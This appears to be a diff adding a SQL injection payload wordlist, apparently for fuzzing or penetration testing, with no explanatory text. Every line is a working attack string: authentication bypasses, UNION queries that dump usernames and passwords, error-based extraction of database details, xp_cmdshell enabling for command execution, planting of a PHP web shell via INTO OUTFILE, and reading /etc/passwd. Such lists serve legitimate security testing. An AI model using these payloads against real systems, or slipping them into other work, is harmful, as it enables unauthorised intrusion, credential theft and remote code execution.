@@ -1,0 +1,63 @@
+' OR 1=1-- -
+" OR 1=1-- -
+') OR 1=1-- -
+") OR 1=1-- -
+' OR '1'='1'-- -
+' OR ''='
+" OR ""="
+') OR ('1'='1
+") OR ("1"="1
+1' OR 1=1-- -
+1" OR 1=1-- -
+1') OR 1=1-- -
+1") OR 1=1-- -
+-1' OR 1=1-- -
+-1" OR 1=1-- -
+' UNION SELECT NULL-- -
+' UNION SELECT NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -
+" UNION SELECT NULL-- -
+" UNION SELECT NULL,NULL-- -
+' UNION SELECT 1-- -
+' UNION SELECT 1,2-- -
+' UNION SELECT 1,2,3-- -
+' UNION SELECT username,password FROM users-- -
+' UNION SELECT table_name,NULL FROM information_schema.tables-- -
+' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -
+' UNION SELECT GROUP_CONCAT(username,0x3a,password) FROM users-- -
+' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()-- -
+1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)-- -
+1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- -
+1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)-- -
+1' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))x)-- -
+1' AND EXP(~(SELECT * FROM (SELECT version())x))-- -
+1' AND GTID_SUBSET(CONCAT((SELECT version())),1)-- -
+1' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(version())) USING utf8)))-- -
+' OR 1=1 LIMIT 1-- -
+' OR 1=1 ORDER BY 1-- -
+' GROUP BY 1-- -
+' GROUP BY 1,2-- -
+' GROUP BY 1,2,3-- -
+' HAVING 1=1-- -
+admin'-- -
+admin'#
+admin'/*
+' OR 1=1#
+" OR 1=1#
+' AND 1=2 UNION SELECT 1,2,3-- -
+' AND 1=2 UNION SELECT 1,version(),3-- -
+' AND 1=2 UNION SELECT 1,user(),3-- -
+' AND 1=2 UNION SELECT 1,database(),3-- -
+' AND 1=2 UNION SELECT 1,@@hostname,3-- -
+' AND 1=2 UNION SELECT 1,@@datadir,3-- -
+' AND 1=2 UNION SELECT 1,@@version_compile_os,3-- -
+' AND (SELECT SUBSTRING(version(),1,1))='5'-- -
+' AND (SELECT SUBSTRING(version(),1,1))='8'-- -
+'; EXEC xp_cmdshell('whoami')-- -
+'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell('whoami')-- -
+' UNION SELECT NULL,NULL,NULL INTO OUTFILE '/tmp/test.txt'-- -
+' UNION SELECT "<?php system($_GET['cmd']); ?>",NULL,NULL INTO OUTFILE '/var/www/html/shell.php'-- -
+' AND LOAD_FILE('/etc/passwd')-- -
+' UNION SELECT LOAD_FILE('/etc/passwd'),NULL-- -
